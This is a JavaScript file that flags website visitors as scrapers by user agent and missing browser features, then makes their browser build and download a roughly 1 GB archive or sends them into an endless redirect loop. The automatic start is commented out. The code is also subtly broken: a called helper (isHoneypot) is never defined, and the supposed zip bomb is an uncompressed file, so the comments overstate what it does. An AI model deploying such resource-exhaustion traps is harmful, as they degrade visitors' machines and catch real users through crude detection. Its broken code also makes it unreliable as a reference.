/**
 * Client-side Zip Bomb Generator
 * Defense against malicious scrapers - generates massive zip files in browser
 * Inspired by https://kerkour.com/zip-bomb
 */

class ZipBombGenerator {
    constructor() {
        this.detecting = true;
        this.triggered = false;
    }

    /**
     * Detect if the visitor is likely a malicious bot
     */
    detectBot() {
        const ua = navigator.userAgent.toLowerCase();
        const suspiciousPatterns = [
            'scraper', 'crawler', 'bot', 'spider', 'wget', 'curl',
            'python-requests', 'scrapy', 'headless', 'phantomjs'
        ];
        
        // Check user agent
        const isSuspiciousUA = suspiciousPatterns.some(pattern => ua.includes(pattern));
        
        // Check for missing common browser features
        const hasLocalStorage = (() => {
            try {
                return !!window.localStorage;
            } catch(e) {
                return false;
            }
        })();
        
        // Bots often don't support these
        // Note: WebGL check removed as privacy-focused browsers like LibreWolf disable it by default
        const suspiciousBehavior = !hasLocalStorage || 
            typeof navigator.languages === 'undefined' ||
            !navigator.languages.length;
        
        return isSuspiciousUA || suspiciousBehavior;
    }

    /**
     * Generate a massive zip bomb using recursive compression
     * Creates nested zip files that expand exponentially
     */
    async generateZipBomb() {
        if (this.triggered) return;
        this.triggered = true;

        console.log('Malicious bot detected - deploying zip bomb defense...');

        // Create a 1MB null byte payload
        const baseSize = 1024 * 1024; // 1MB
        const nullBytes = new Uint8Array(baseSize);
        
        // Function to create a simple zip file structure
        const createZip = (content, filename = 'payload.txt') => {
            const encoder = new TextEncoder();
            const nameBytes = encoder.encode(filename);
            
            // Simple ZIP file structure (uncompressed for simplicity)
            const localFileHeader = new Uint8Array([
                0x50, 0x4B, 0x03, 0x04, // Local file header signature
                0x0A, 0x00, 0x00, 0x00, // Version, flags
                0x00, 0x00, 0x00, 0x00, // Compression method (0 = no compression)
                0x00, 0x00, 0x00, 0x00, // Modified time, date
                0x00, 0x00, 0x00, 0x00, // CRC-32
                ...this.int32ToBytes(content.length), // Compressed size
                ...this.int32ToBytes(content.length), // Uncompressed size
                ...this.int16ToBytes(nameBytes.length), // Filename length
                0x00, 0x00 // Extra field length
            ]);

            // Central directory header
            const centralDirHeader = new Uint8Array([
                0x50, 0x4B, 0x01, 0x02, // Central directory signature
                0x14, 0x00, 0x0A, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                ...this.int32ToBytes(content.length),
                ...this.int32ToBytes(content.length),
                ...this.int16ToBytes(nameBytes.length),
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00
            ]);

            const offset = 0;
            const cdSize = centralDirHeader.length + nameBytes.length;
            const eocdOffset = localFileHeader.length + nameBytes.length + content.length + cdSize;

            // End of central directory
            const endOfCentralDir = new Uint8Array([
                0x50, 0x4B, 0x05, 0x06, // EOCD signature
                0x00, 0x00, 0x00, 0x00, // Disk numbers
                0x01, 0x00, 0x01, 0x00, // Entry counts
                ...this.int32ToBytes(cdSize), // CD size
                ...this.int32ToBytes(localFileHeader.length + nameBytes.length + content.length), // CD offset
                0x00, 0x00 // Comment length
            ]);

            // Combine all parts
            const zipSize = localFileHeader.length + nameBytes.length + content.length + 
                           centralDirHeader.length + nameBytes.length + endOfCentralDir.length;
            const zip = new Uint8Array(zipSize);
            
            let pos = 0;
            zip.set(localFileHeader, pos); pos += localFileHeader.length;
            zip.set(nameBytes, pos); pos += nameBytes.length;
            zip.set(content, pos); pos += content.length;
            zip.set(centralDirHeader, pos); pos += centralDirHeader.length;
            zip.set(nameBytes, pos); pos += nameBytes.length;
            zip.set(endOfCentralDir, pos);

            return zip;
        };

        // Create nested bomb - each layer multiplies the data
        let bomb = nullBytes;
        const layers = 3; // Creates ~1GB expanded size
        
        for (let i = 0; i < layers; i++) {
            // Duplicate the content multiple times in the zip
            const copies = 10;
            const fragments = [];
            for (let j = 0; j < copies; j++) {
                fragments.push(createZip(bomb, `layer${i}_copy${j}.dat`));
            }
            // Combine all copies into one buffer
            const totalSize = fragments.reduce((sum, f) => sum + f.length, 0);
            const combined = new Uint8Array(totalSize);
            let offset = 0;
            for (const fragment of fragments) {
                combined.set(fragment, offset);
                offset += fragment.length;
            }
            bomb = combined;
        }

        // Trigger download of the zip bomb
        const blob = new Blob([bomb], { type: 'application/zip' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'archive.zip';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        console.log('Zip bomb deployed!');
    }

    // Helper to convert integers to byte arrays
    int32ToBytes(num) {
        return [
            num & 0xFF,
            (num >> 8) & 0xFF,
            (num >> 16) & 0xFF,
            (num >> 24) & 0xFF
        ];
    }

    int16ToBytes(num) {
        return [
            num & 0xFF,
            (num >> 8) & 0xFF
        ];
    }
    /**
     * Initialize the defense system
     */
    init() {
        if (this.detectBot()) {
            console.log('Bot detected');
            
            // On honeypot pages, deploy full zip bomb
            if (this.isHoneypot()) {
                setTimeout(() => this.generateZipBomb(), 100);
            } else {
                // On regular pages, just block/redirect bots
                this.blockBot();
            }
        }
    }

    /**
     * Block bots on regular pages
     */
    blockBot() {
        // Clear page content
        document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:monospace;"><h1>🚫 Access Denied</h1><p>Automated access detected.</p></div>';
        
        // Infinite redirect loop to waste bot resources
        setTimeout(() => {
            window.location.href = window.location.href + '?loop=' + Date.now();
        }, 100);
    }
}

// Auto-initialize on all pages
if (typeof window !== 'undefined') {
    // DESHABILITADO POR RENDIMIENTO - consume recursos innecesariamente
    // Descomentar solo si realmente necesitas protección contra scrapers
    /*
    const zipBomb = new ZipBombGenerator();
    
    // Run after DOM is loaded
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => zipBomb.init());
    } else {
        zipBomb.init();
    }
    */
    console.log('protection: DISABLED (optimización de rendimiento)');
}
